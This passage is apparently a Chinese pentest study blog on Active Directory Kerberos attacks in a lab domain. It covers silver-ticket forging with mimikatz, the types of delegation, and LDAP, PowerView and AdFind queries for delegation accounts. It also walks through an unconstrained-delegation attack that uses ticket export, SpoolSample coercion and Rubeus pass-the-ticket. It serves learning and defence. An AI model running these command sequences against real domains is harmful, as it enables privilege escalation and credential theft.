<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">dns</span> &quot;以太网&quot; <span class="hljs-symbol">static</span> 域控<span class="hljs-symbol">ip</span><br></code></pre></td></tr></table></figure>



<p>操作</p>
<p>首先尝试远程访问C盘</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230217232329609.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230217232329609</span></p>
<p>权限不够，拒绝访问</p>
<p>生成白银票据，导入内存</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /domain:sayms.local /S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">199966615</span>-<span class="hljs-number">2708578713</span>-<span class="hljs-number">1277870648</span> /target:DC.sayms.local /service:cifs /rc4:<span class="hljs-number">80</span>a28b3ca1457d5d09adf2e153d98b1d /user:administrator /ptt<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218094012033.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230218094012033</span></p>
<p>然后就能够远程访问域控C盘</p>
<p>但是我这里无法访问是失败的，很奇怪导入成功还是无法访问</p>
<h3 id="利用CS攻击-1"><a href="#利用CS攻击-1" class="headerlink" title="利用CS攻击"></a>利用CS攻击</h3><p>和mimikatz一样，也可以是非域内主机，但是需要设置本地DNS为域控</p>
<p>CS是没有白银票据这个模块的，但是导入插件可以实现</p>
<p>使用方法很简单，只需要填相应参数即可</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade">伪造用户名（一般是高权限用户）<br><br>ID值（一般是<span class="hljs-number">500</span>）<br><br>域名<br><br>SID<br><br>目标主机名<br><br><span class="hljs-built_in">hash</span>（服务对应的<span class="hljs-built_in">hash</span>）<br><br>伪造的服务<br></code></pre></td></tr></table></figure>





<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>防御白银票据比较好的方式是，开启验证PAC签名，前面说了，一部分原因就是因为默认不认证，所以可以伪造</p>
<p>但是对于一些本地注册系统服务来说，比如SMB、CIFS、HOST，是无法开启验证的</p>
<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><font color='red'>委派是指把域内用户的权限委派给服务账户，使服务账户能够以用户的权限访问域内其他服务</font></p>
<p>在域内，只有主机账户和服务账户才有委派属性</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>委派分为三种类型</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">非约束性委派<br><br>约束性委派<br><br>基于资源的约束性委派<br></code></pre></td></tr></table></figure>





<h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派，服务账户可以获取被委派用户的TGT，并将该TGT缓存到LSASS进程中，服务账户就可以使用该TGT访问任意服务</p>
<p>适用于windows server 2000</p>
<p>非约束性委派需要设置    SeEnableDelegationPrivilege特权，该权限默认    域管    和    企业管理员    拥有</p>
<p><font color='red'>域控默认配置了非约束性委派</font></p>
<p>拥有非约束性委派的机器账户userAccountControl属性的flag为WORKSTATION_TRUST_ACCOUNT|TRUSTED_FOR_DELEGATION，值为528384</p>
<p>拥有非约束性委派的服务账户userAccountControl属性的flag为NORMAL_ACCOUNT|TRUSTED_FOR_DELEGATION，值为524800</p>
<p>非约束性委派的流程</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218113103964.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230218113103964</span></p>
<p>从上面的流程，我们可以想到，如果我们控制了服务1，然后诱骗域管来请求服务1，我们就可以拿到域管TGT，从而可以高权限访问任意服务</p>
<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>因为考虑到非约束性委派的不安全性，微软在Windows server 2003就发布了约束性委派</p>
<p>服务账户获取到TGT之后，只能访问用户指定的服务ST，即增加了msDS-AllowedToDelegateTo，这属性来控制能够访问的指定服务</p>
<p>约束性委派账户的设置是需要SeEnableDelegationPrivilege特权的，该权限只有域管和企业管理员拥有</p>
<p>约束性委派分为两种</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">只能使用kerberos，不能进行协议转换<br><br>可以使用任何身份认证协议，能够进行协议转换<br></code></pre></td></tr></table></figure>



<p>kerberos约束性委派的机器账户和服务账户的userAccountControl属性和正常账户一样，但是其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p>可以使用任何身份认证协议的约束性委派机器账户的userAccountControl属性的flag位为WORKSTATION_TRUST_ACCOUNT|TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION，值为16781312</p>
<p>其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p>可以使用任何身份认证协议的约束性委派服务账户的userAccountControl属性的flag位为</p>
<p>NORMAL_ACCOUNT|TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION，值为16777728</p>
<p>其msDS-AllowedToDelegateTo属性会有允许被委派服务的SPN</p>
<p><strong>约束性委派的流程</strong></p>
<p>为了kerberos能够支持约束性委派，微软的kerberos协议扩展了两个自协议</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">S4u2Self（Service for <span class="hljs-keyword">User</span> <span class="hljs-title">to</span> Self）<br>可以代表任意用户请求自身的ST<br><br>S4u2Proxy（Service for <span class="hljs-keyword">User</span> <span class="hljs-title">to</span> Proxy）<br>用上一步获得的ST以用户的名义请求其他服务的ST<br></code></pre></td></tr></table></figure>



<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218175023956.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230218175023956</span></p>
<p>那么，如果我们拿到了服务1的权限，那么我们可以拥有，服务1以及可以访问的其他服务，如果服务1配置了到域控的CIFS约束性委派，那么我们可以利用服务1以任意用户权限访问域控</p>
<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>为了使用户和资源更加独立，微软在windows server 2012中引入了基于资源的约束性委派</p>
<p>基于资源的约束性委派是把权限赋予了服务</p>
<p>配置了基于资源的约束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性值为被允许委派账户的SID</p>
<p>流程</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230218220320603.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230218220320603</span></p>
<p>谁能配置基于资源的约束性委派的权限？</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">上面可知基于资源的约束性委派，是通过msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span>属性值的修改实现的<br><br>用AdFind查找谁能修改该属性，查询域内机器win2012R2<br>AdFind.exe <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;&amp;(objectcategory=computer)(name=win2012R2)&quot;</span> msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span><br></code></pre></td></tr></table></figure>

<p>如果没有该属性</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">那么就是谁创建了该属性，谁就有权限<br><br>用AdFind查找<br>AdFind.exe <span class="hljs-params">-b</span> <span class="hljs-literal">CN</span>=win2016,<span class="hljs-literal">CN</span>=Computers,DC=sayms,DC=<span class="hljs-built_in">local</span> <span class="hljs-params">-sc</span> getacl <span class="hljs-params">-sddl</span>+++ <span class="hljs-params">-sddlfilter</span> ;;<span class="hljs-string">&quot;WRT PROP&quot;</span>;;;<br></code></pre></td></tr></table></figure>



<p><strong>最后发现，拥有该权限的用户有域管、SELF、将计算机加入域的域用户</strong></p>
<p>利用方法</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">在服务<span class="hljs-selector-tag">B</span>上设置允许服务<span class="hljs-selector-tag">A</span>委派<br><br>控制服务<span class="hljs-selector-tag">A</span>使用S4u2Self协议，向域控请求任意用户访问自己的ST<br><br>控制服务<span class="hljs-selector-tag">A</span>使用S4u2Proxy协议，转发此ST去请求服务<span class="hljs-selector-tag">B</span>的ST<br><br>最后我们就可以使用任意用户去访问<span class="hljs-selector-tag">B</span>了<br></code></pre></td></tr></table></figure>

<p>利用条件</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">拥有服务<span class="hljs-selector-tag">A</span>的权限，拥有一个普通域内账户，一个域内账户可以创建<span class="hljs-number">10</span>个机器账户，机器账户可以当服务账户<br><br>拥有修改<span class="hljs-selector-tag">B</span>上允许<span class="hljs-selector-tag">A</span>访问的权限<br></code></pre></td></tr></table></figure>





<h3 id="查询能够域委派账户"><a href="#查询能够域委派账户" class="headerlink" title="查询能够域委派账户"></a>查询能够域委派账户</h3><p>上面说了各种域委派类型，下面就是找到能够进行域委派的账户</p>
<p>可以通过LDAP进行过滤</p>
<p>通过这三个属性可以找出准确的域委派账户</p>
<p>userAccountControl</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">该属性可以分别哪些账户可以进行域委派<br>因为只有主机账户和服务账户才可以进行域委派<br>该属性可以判别账户类型<br><br><span class="hljs-attribute">samAccountType</span><span class="hljs-operator">=</span><span class="hljs-number">805306369</span>为主机账户<br><span class="hljs-attribute">samAccountType</span><span class="hljs-operator">=</span><span class="hljs-number">805306368</span>为服务账户<br></code></pre></td></tr></table></figure>



<p>AllowedToDelegateTo</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">该属性是约束性委派账户才有值的，基于资源的约束性委派也有该属性，但是没有被赋值<br><br>该属性指向能够委派的服务SPN（就是<span class="hljs-selector-tag">A</span>账户委派的服务能够访问哪些服务）<br></code></pre></td></tr></table></figure>



<p>AllowedToActOnBehalfOfOtherIdentity</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">这个就是基于资源的约束性委派账户有的<br><br>这个属性的值是服务具有的，就是指向哪些服务能够访问它<br>权限在资源手中，不在KDC中<br></code></pre></td></tr></table></figure>

<p>通过这三个属性就能判别，一个账户是属于哪种账户</p>
<h4 id="查询非约束性委派的主机或服务账户"><a href="#查询非约束性委派的主机或服务账户" class="headerlink" title="查询非约束性委派的主机或服务账户"></a>查询非约束性委派的主机或服务账户</h4><p>powersploit下的PowerView.ps1</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell -exec bypass<br><br><span class="hljs-keyword">Import</span>-Module .\PowerView.ps1;<br><br>#查询非约束性委派的主机<br><span class="hljs-keyword">Get</span>-NetComputer -Unconstrained -<span class="hljs-keyword">Domain</span> sayms.<span class="hljs-keyword">local</span><br><br>#查询非约束性委派的服务账户<br><span class="hljs-keyword">Get</span>-Netuser -Unconstrained -<span class="hljs-keyword">Domain</span> sayms.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span><br></code></pre></td></tr></table></figure>





<p>Adfind</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-comment">#查询非约束性委派的主机</span><br><span class="hljs-symbol">Adfind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br><br><span class="hljs-comment">#查询非约束性委派的服务账户</span><br><span class="hljs-symbol">Adfind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询非约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br><br><span class="hljs-comment">#查询非约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br></code></pre></td></tr></table></figure>







<h4 id="查询约束性委派的主机或服务账户"><a href="#查询约束性委派的主机或服务账户" class="headerlink" title="查询约束性委派的主机或服务账户"></a>查询约束性委派的主机或服务账户</h4><p>empire下的powerview.ps1</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell -exec bypass<br><br><span class="hljs-keyword">Import</span>-Module .\PowerView.ps1;<br><br>#查询约束性委派的主机<br><span class="hljs-keyword">Get</span>-DomainComputer -TrustedToAuth -<span class="hljs-keyword">Domain</span> sayma.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,msds-allowedtodelegateto<br><br>#查询约束性委派的服务账户<br><span class="hljs-keyword">Get</span>-DomainUser -TrustedToAuth -<span class="hljs-keyword">Domain</span> sayma.<span class="hljs-keyword">local</span> | <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>





<p>Adfind</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#查询约束性委派的主机</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br><br><span class="hljs-comment">#查询约束性委派的服务账户</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> | <span class="hljs-keyword">grep</span> -e dn -e msDS-AllowedToDelegateTo<br><br><span class="hljs-comment">#查询约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> | <span class="hljs-keyword">grep</span> -e dn -e msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>







<h4 id="查询基于资源的约束性委派的主机或服务账户"><a href="#查询基于资源的约束性委派的主机或服务账户" class="headerlink" title="查询基于资源的约束性委派的主机或服务账户"></a>查询基于资源的约束性委派的主机或服务账户</h4><p>Adfind</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#查询基于资源的约束性委派的主机</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> msDS-AllowedToActOnBehalfOfOtherIdentity<br><br><span class="hljs-comment">#查询基于资源的约束性委派的服务账户</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> msDS-AllowedToActOnBehalfOfOtherIdentity<br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询基于资源的约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br><br><span class="hljs-comment">#查询基于资源的约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br></code></pre></td></tr></table></figure>





<h4 id="查询某个账户是否具有委派性"><a href="#查询某个账户是否具有委派性" class="headerlink" title="查询某个账户是否具有委派性"></a>查询某个账户是否具有委派性</h4><p>通过查看服务账户和机器账户的属性，来判断是否具有委派性</p>
<p>账户没有委派性，<strong>只有</strong>userAccountControl有值</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#服务账户的值</span><br><span class="hljs-keyword">NORMAL_ACCOUNT</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment">#机器账户的值</span><br>WORKSTATION_TRUST_ACCOUNT<br></code></pre></td></tr></table></figure>







<h3 id="委派攻击操作"><a href="#委派攻击操作" class="headerlink" title="委派攻击操作"></a>委派攻击操作</h3><p>委派攻击攻击发生在TGS_REQ、TGS_REP</p>
<h4 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h4><p>思路就是诱骗域管理员来访问服务，从而获得TGT票据</p>
<p><strong>诱骗域管访问服务</strong></p>
<p>首先先设置win7具有允许委派属性</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219090956104.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219090956104</span></p>
<p>然后使用域管账户远程ipc连接win7</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\win7.sayms.<span class="hljs-keyword">local</span> <span class="hljs-string">&quot;admin123$%&quot;</span> /user:<span class="hljs-string">&quot;sayms\tony&quot;</span><br></code></pre></td></tr></table></figure>

<p>连接之后会产生TGT票据</p>
<p>在win7上，使用mimikatz获取内存的票据</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br><br>sekurlsa::tickers /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104414101.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219104414101</span></p>
<p>将票据导入内存</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">kerberos::ptt [<span class="hljs-number">0</span>;ade48]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">60810000</span>-tony<span class="hljs-keyword">@krbtgt-SAYMS</span>.LOCAL.kirbi<br><br><span class="hljs-attribute">kerberos</span>::list<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104646584.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219104646584</span></p>
<p>尝试访问域控</p>
<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104752336.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219104752336</span></p>
<p>成功，在没有票据之前，是无法通过ipc远程访问域控的</p>
<p>但是此方法是比较鸡肋的，需要域管主动来访问服务，主动权在域管手中</p>
<p><strong>结合在打印机漏洞攻击</strong></p>
<p>可以利用打印机服务漏洞，来强制域控连接配置了非约束性委派的主机</p>
<p>首先配置监听</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#每隔一秒监听一次来自DC域控的票据</span><br>rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:DC$<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219112648694.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219112648694</span></p>
<p>然后在win7上使用打印机服务漏洞攻击域控DC，使域控强制回连认证</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">SpoolSample.exe DC wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure>



<p>看到rebeus收到来自域控的票据</p>
<p>票据里面是有换行符的，需要去掉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>):<br>    data += line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;保存完毕&#x27;</span>)<br></code></pre></td></tr></table></figure>



<p>然后直接使用rubeus导入该票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rubeus.exe ptt /ticket:<span class="hljs-built_in">base64</span>的票据<br></code></pre></td></tr></table></figure>

<p>然后就可以进行高权限操作了</p>
<p><strong>域控的机器账户不能用于登陆，但是可以导出hash</strong></p>
<h4 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h4><p><strong>环境配置</strong></p>
<p>首先设置账户aim进行约束性委派</p>
<p>将aim注册为SPN服务账户</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -S cifs/DC<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> aim<br></code></pre></td></tr></table></figure>

<p>然后设置约束性委派</p>
